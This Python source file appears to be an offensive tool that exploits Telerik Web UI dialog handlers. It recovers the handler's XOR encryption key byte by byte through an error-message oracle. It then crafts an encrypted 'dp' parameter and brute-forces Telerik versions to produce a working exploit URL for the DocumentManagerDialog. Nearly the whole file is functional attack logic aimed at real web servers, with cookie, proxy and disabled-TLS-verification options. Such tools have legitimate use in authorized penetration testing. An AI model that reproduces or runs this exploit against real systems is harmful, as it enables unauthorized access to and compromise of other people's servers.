import re
import sys
import string
import base64
import requests
import itertools
from lib.constants import *
from datetime import datetime

def byte_xor(ba1, ba2):
    return bytes([b1 ^ b2 for b1, b2 in zip(ba1, ba2)])

def repeated_key_xor(pt, key):

    len_key = len(key)
    encoded = []
    for i in range(0, len(pt)):
        encoded.append(pt[i] ^ key[i % len_key])
    return bytes(encoded)

def isB64Character(testByte):
    if ord(testByte) in b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/+=":
        return True
    else:
        return False

def is_hex(s):
    return re.fullmatch(r"^[0-9a-fA-F]$", s or "") is not None

class CryptOMG:
    def __init__(
        self,
        debug=False,
        url="",
        handler="DH",
        cookie=None,
        knownkey="",
        version=None,
        resume=None,
        length=48,
        proxy=None,
        terminal=None,
        mthlock=None,
    ):

        self.solved_blocks = []
        self.current_pos = 0
        self.request_count = 0
        self.status_messages = []
        self.terminal = terminal
        self.possible_values = []
        self.last_request = ""
        self.detector_byte = ""
        self.finalkey = ""
        self.mthlock = None
        self.debug = debug
        self.url = url
        self.handler = handler
        self.cookie = cookie
        self.knownkey = knownkey
        self.version = version
        self.resume = resume
        self.length = length
        self.exploit_url = ""
        self.findKeyComplete = False

        if proxy:
            self.proxy = {"http": proxy, "https": proxy}
        else:
            self.proxy = None

        if knownkey:

            if len(self.knownkey) >= self.length:
                self.finalkey = self.knownkey
            else:
                self.solved_blocks = [self.knownkey[i : i + 4] for i in range(0, len(self.knownkey), 4)]

    def msgPrint(self, msg, style="normal"):

        now = datetime.now()
        self.terminal.log_messages.append((msg, style, now.strftime("%H:%M:%S.%f")))
        self.terminal.log_messages_draw()
        return

    def findKey(self):
        try:
            if not self.finalkey:
                while 1:
                    self.solveBlock()
                    if len(b"".join(self.solved_blocks)) == self.length:
                        break

                finalkey = b"".join(self.solved_blocks)
                self.finalkey = finalkey
                self.msgPrint("Found final key! [" + finalkey.hex() + "]", style="success")
                self.findKeyComplete = True

            else:
                self.msgPrint("Starting with known key, skipping to payload generation")
            self.generate_payload()
        except Exception as e:
            self.msgPrint(e, style="error")

    def generate_payload(self):

        if self.handler == "SP":
            self.msgPrint("Skipping version check / payload URL generation since handler is SpellCheckHandler")
            self.terminal.exploit_url_draw()
            return

        versions = []
        for v in telerik_versions:
            versions.append(v)
        undotted_versions = []
        for v in telerik_versions:
            undotted_versions.append(re.sub(r"\.(?=\d+$)", "", v))
        versions += undotted_versions

        if self.version:
            versions = [self.version]
            self.msgPrint(f"Using known version {self.version} to attempt to generate exploit URL")
        else:
            self.msgPrint(f"Bruteforcing versions to generate exploit URL")

        for version in versions:
            self.msgPrint(f"Bruteforcing version {version}", style="debug")
            b64section_plain = f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
            b64section = base64.b64encode(b64section_plain.encode()).decode()
            plaintext = f"EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmc9PSxmZz09;EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;UploadPaths,True,0,Zmc9PQo=;SearchPatterns,True,0,S2k0cQ==;EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;ViewPaths,True,0,Zmc9PQo=;IsSkinTouch,False,3,False;ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};AllowMultipleSelection,False,3,False"
            plaintextB64 = base64.b64encode(plaintext.encode()).decode()
            ciphertext = bytes(repeated_key_xor(plaintextB64.encode(), self.finalkey))
            ciphertextB64 = base64.b64encode(ciphertext).decode()
            full_url = f"{self.url}{telerik_params}&dp={ciphertextB64}"

            r = self.versionProbe(full_url, version)
            if r.status_code == 200 and b"Error" not in r.content:
                self.msgPrint(f"Vulnerable component confirmed! Version is: {[version]}", style="success")
                self.exploit_url = full_url
                self.terminal.exploit_url_draw()
                return

        self.msgPrint(f"Could not confirm version!", style="error")
        return

    def versionProbe(self, fullurl, version):

        headers = {}
        if self.cookie:
            headers["cookie"] = self.cookie
        self.request_count += 1
        self.terminal.footer_draw()
        r = requests.get(fullurl, headers=headers, verify=False, proxies=self.proxy)
        self.msgPrint(
            f"Sent version for version {version}. Resulting code: [{r.status_code}] Response Size: [{len(r.content)}] (Total request count: [{self.request_count}])",
            style="debug",
        )
        return r

    def solveBlock(self):

        prefix = b"".join(self.solved_blocks)
        block = Block(self.url, prefix, self)
        block.find_baseline()

        self.current_pos = 1
        self.terminal.status_draw()
        block.pos1.solve_byte()
        self.current_pos = 2
        self.terminal.status_draw()
        block.pos2.solve_byte()
        self.current_pos = 3
        self.terminal.status_draw()
        block.pos3.solve_byte()
        self.current_pos = 4
        self.terminal.status_draw()
        block.pos4.solve_byte()
        self.current_pos = 0
        self.terminal.status_draw()

        solvedBlock = bytes([block.pos1.solved, block.pos2.solved, block.pos3.solved, block.pos4.solved])
        self.msgPrint("Solved Block! Block Value: [" + solvedBlock.hex() + "]}", style="success")
        self.solved_blocks.append(solvedBlock)
        self.terminal.progress_bar_draw()


class Block:
    def __init__(self, url, prefix, parent):
        self.url = url
        self.prefix = prefix
        self.baseline = None
        self.parent = parent
        self.pos1 = KeyPosition(1, self)
        self.pos2 = KeyPosition(2, self)
        self.pos3 = KeyPosition(3, self)
        self.pos4 = KeyPosition(4, self)

    def sendProbe(self, randBytes, additionalParams=None):

        self.parent.detector_byte = randBytes.hex()
        self.parent.request_count += 1
        self.parent.terminal.footer_draw()
        encryptedPrefix = byte_xor(b"A" * len(self.prefix), self.prefix)

        headers = {}
        if self.parent.cookie:
            headers["cookie"] = self.parent.cookie

        if self.parent.handler == "DH":
            if additionalParams:
                fullUrl = f"{str(self.url)}{str(additionalParams)}&dp={base64.b64encode((encryptedPrefix + randBytes.encode())).decode()}"
            else:
                fullUrl = f"{str(self.url)}?dp={base64.b64encode((encryptedPrefix + randBytes)).decode()}"

            r = requests.get(fullUrl, headers=headers, verify=False, proxies=self.parent.proxy)

        elif self.parent.handler == "SP":

            fullUrl = f"{str(self.url)}"
            data = {
                "DictionaryLanguage": "en-US",
                "Configuration": base64.b64encode((encryptedPrefix + randBytes)).decode(),
            }
            r = requests.post(fullUrl, headers=headers, data=data, verify=False, proxies=self.parent.proxy)

        else:
            self.parent.msgPrint("Invalid Handler Type!", style="error")
            sys.exit()

        self.parent.last_request = fullUrl
        self.parent.request_count += 1
        self.parent.terminal.last_request_draw()
        self.parent.terminal.detector_byte_draw()

        if (
            "Index was outside the bounds of the array." in r.text
            or "String was not recognized as a valid Boolean." in r.text
        ):
            return 1
        else:
            return 0

    def equals_check_34(self):
        if self.baseline == b"\x00\x00\x00\x00":

            # these two bytes work to detect an equals when it is allowed in a position
            eq_probe_1 = self.sendProbe(b"\x00\x00\x00\x01")
            eq_probe_2 = self.sendProbe(b"\x00\x00\x00\x02")

            if (eq_probe_1 == 0) and (eq_probe_2 == 0):
                self.pos4.solved = ord(b"=")
                self.parent.msgPrint("Discovered [=] character in position 4", style="success")

                # check for the super weird case of 3 and 4 being =. 4 being an ='s means its allowed in this position
                if self.baseline[2] == 0:

                    eq_probe_1 = self.sendProbe(b"\x00\x00\x01\x00")
                    eq_probe_2 = self.sendProbe(b"\x00\x00\x02\x00")
                    if (eq_probe_1 == 0) and (eq_probe_2 == 0):
                        self.pos3.solved = ord(b"=")
                        self.parent.msgPrint("Discovered [=] character in position 3", style="success")

    def equals_check_3(self):
        eq_probe_1 = self.sendProbe(b"\x00\x00\x05\x00")
        eq_probe_2 = self.sendProbe(b"\x00\x00\x12\x00")
        eq_probe_3 = self.sendProbe(b"\x00\x00\x71\x00")

        # These bytes all have = in bucket 1 but every non-printable character is out of AT LEAST of them. Only an = will produce a positive result for all 3.
        if (eq_probe_1 == 1) and (eq_probe_2 == 1) and (eq_probe_3 == 1):
            self.pos3.solved = ord(b"=")
            self.parent.msgPrint("Discovered [=] character in position 3", style="success")

    def equals_check_1(self):
        eq_probe_1 = self.sendProbe(b"\x05\x00\x00\x00")
        eq_probe_2 = self.sendProbe(b"\x12\x00\x00\x00")
        eq_probe_3 = self.sendProbe(b"\x71\x00\x00\x00")

        # These bytes all have = in bucket 1 but every non-printable character is out of AT LEAST of them. Only an = will produce a positive result for all 3.
        if (eq_probe_1 == 1) and (eq_probe_2 == 1) and (eq_probe_3 == 1):
            self.pos1.solved = ord(b"=")
            self.parent.msgPrint("Discovered [=] character in position 1", style="success")

    def equals_check_2(self):
        eq_probe_1 = self.sendProbe(b"\x00\x05\x00\x00")
        eq_probe_2 = self.sendProbe(b"\x00\x12\x00\x00")
        eq_probe_3 = self.sendProbe(b"\x00\x71\x00\x00")

        # These bytes all have = in bucket 1 but every non-printable character is out of AT LEAST of them. Only an = will produce a positive result for all 3.
        if (eq_probe_1 == 1) and (eq_probe_2 == 1) and (eq_probe_3 == 1):
            self.pos2.solved = ord(b"=")
            self.parent.msgPrint("Discovered [=] character in position 2", style="success")

    def equals_check(self):
        self.parent.msgPrint("Attempting to perform check for [=] character")

        # we might have an = in the 3/4 slots
        if self.baseline[2:] == b"\x00\x00":
            self.equals_check_34()

        # we might have an = in the 1 slot
        if self.baseline[0] == 107:
            self.equals_check_1()

        # we might have an = in the 2 slot
        if self.baseline[1] == 107:
            self.equals_check_2()

        # we might have an = in the 3 slot
        if self.baseline[2] == 107:
            self.equals_check_3()

    def find_baseline(self):
        self.parent.msgPrint("Attempting to discover detector byte baseline")
        test_chars = [b"\x00", b"\x6b", b"\x08"]

        for i in itertools.product(test_chars, repeat=4):

            if self.sendProbe(b"".join(i)):
                self.baseline = b"".join(i)
                self.parent.msgPrint(f"Found detector byte baseline: [{self.baseline}]", style="success")

                self.equals_check()
                return

        self.parent.msgPrint(f"Could not build a working baseline. Target may not be vulnerable.", style="error")
        self.parent.msgPrint(f"Try all character mode (-a) if currently in ASCII Printable mode", style="error")
        sys.exit()

class KeyPosition:
    def __init__(self, pos, parent):
        self.parent = parent
        self.solved = None
        self.pos = pos
        self.possible_values = []

        for i in range(256):
            self.possible_values.append(i)

    def solve_byte(self):

        if self.solved:
            self.parent.parent.msgPrint(
                f"Position is already solved with key byte {[self.solved]}, skipping to next byte"
            )
        else:
            self.parent.parent.terminal.possible_values_draw()
            while 1:
                self.parent.parent.terminal.possible_values_draw()
                split_dict, distance_dict = self.findSplittingProbe()
                sorted_dict = sorted(distance_dict.items(), key=lambda x: x[1])

                for distance_tuple in sorted_dict:
                    fullprobe_list = list(self.parent.baseline)
                    intProbe = int(distance_tuple[0])
                    self.parent.parent.msgPrint(
                        f"Trying probe: {[int(distance_tuple[0])]} which has a split distance of {[distance_tuple[1]]}",
                        style="debug",
                    )

                    if self.pos == 1:
                        fullprobe_list[0] = intProbe
                    elif self.pos == 2:
                        fullprobe_list[0] = self.parent.pos1.solved ^ 65
                        fullprobe_list[1] = intProbe
                    elif self.pos == 3:
                        fullprobe_list[0] = self.parent.pos1.solved ^ 65
                        fullprobe_list[1] = self.parent.pos2.solved ^ 65
                        fullprobe_list[2] = intProbe
                    elif self.pos == 4:

                        fullprobe_list[0] = self.parent.pos1.solved ^ 65
                        fullprobe_list[1] = self.parent.pos2.solved ^ 65
                        fullprobe_list[2] = self.parent.pos3.solved ^ 65
                        fullprobe_list[3] = intProbe

                    else:
                        self.parent.parent.msgPrint("self.pos is set incorrectly", style="error")
                    fullprobe = bytes(fullprobe_list)
                    if self.parent.sendProbe(fullprobe):
                        self.possible_values = split_dict[intProbe][0]

                        self.parent.parent.possible_values = self.possible_values
                        self.parent.parent.terminal.possible_values_draw()
                        break
                    else:
                        self.parent.parent.msgPrint(
                            f"Got negative results, cant trust it because of =...", style="debug"
                        )

                if len(self.possible_values) == 1:
                    self.solved = self.possible_values[0]

                    self.parent.parent.msgPrint(
                        f"Solved Byte [{self.pos}]! Key byte is: [{self.solved}]", style="success"
                    )
                    break

    def findSplittingProbe(self):

        split_dict = {}
        distance_dict = {}
        for b2 in range(256):
            bucket1 = []
            bucket2 = []

            for i in self.possible_values:

                decrypted = i ^ b2
                if isB64Character(chr(decrypted)):
                    bucket1.append(i)
                else:
                    bucket2.append(i)
            bucket_distance = abs(len(bucket1) - len(bucket2))
            distance_dict[b2] = bucket_distance
            split_dict[b2] = (bucket1, bucket2)
        return split_dict, distance_dict
